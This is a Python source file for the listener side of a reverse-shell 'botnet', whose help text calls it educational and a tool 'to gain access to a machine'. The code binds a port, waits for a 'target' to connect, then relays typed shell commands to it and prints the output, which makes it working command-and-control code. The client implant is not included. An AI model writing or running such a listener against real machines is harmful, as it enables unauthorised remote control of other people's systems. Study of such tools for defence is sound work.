# Socket allows us to initiate an internet connection between 2 machines
import socket
import time


class Server:

    def __init__(self, address, port):
        self.server_socket = None
        self.create_socket()
        self.connect(address, port)
        self.connection_handler()
        self.addr = ''
        self.target = None

    def connect(self, address, port):
        self.server_socket.bind((socket.gethostbyname(socket.gethostname()), port))

    def create_socket(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def connection_handler(self):
        """
            Ensure the connection between the server and the client.
            When the connection has been properly calls the shell function
        """
        print('[+] Listening for the incoming connection')
        self.server_socket.listen(100)
        self.target, self.addr = self.server_socket.accept()
        print(f'[+] Target connected from {str(self.addr)}')
        self.shell()

    def shell(self):
        """
          Listen to input, encode it in UTF-8 then send it to the client / receive the response (dummy)
        """
        with self.target as target:
            print(target.recv(1024).decode('utf-8'))
            while True:
                command = input(f'shell#~{self.addr[0]}@{self.addr[1]}: ')
                if command == '':
                    command = "\n"
                elif command == 'exit':
                    break
                target.sendall(command.encode('utf-8'))

                data = target.recv(1024)
                print(data.decode('utf-8'))


def main():
    from sys import argv

    address, port = '', 23164
    argv_number = 0

    for arg in argv:
        if arg.startswith("--help") or arg.startswith('-h'):
            print(
                """
                This botnet is for educational purpose only.
                It helps understanding a well known tool used to gain access to a machine.

                You can use it with the command :

                python3 raw-server.py --address=<ADDRESS> --port=<PORT>

                The Server side contains 2 optional arguments :

                <--address=> or <-a=> | Reference the host address. Set to an empty string by default. <--port=> or 
                <-p=> | Reference the port that will be used by the client to connect to the server. Set to '23164' 
                by default. 

                """)
            exit()
        if arg.startswith("--address=") or arg.startswith("-a="):
            address = arg.split("=")[1]
            argv_number += 1
        elif arg.startswith("--port=") or arg.startswith("-p="):
            try:
                port = int(arg.split("=")[1])
            except ValueError:
                print("ERROR : port must be an integer.")
            else:
                argv_number += 1
    if len(argv) - argv_number > 1:
        print('The options available are <--address=> and <--port=>.')
        exit()

    Server(address, port)


if __name__ == '__main__':
    main()
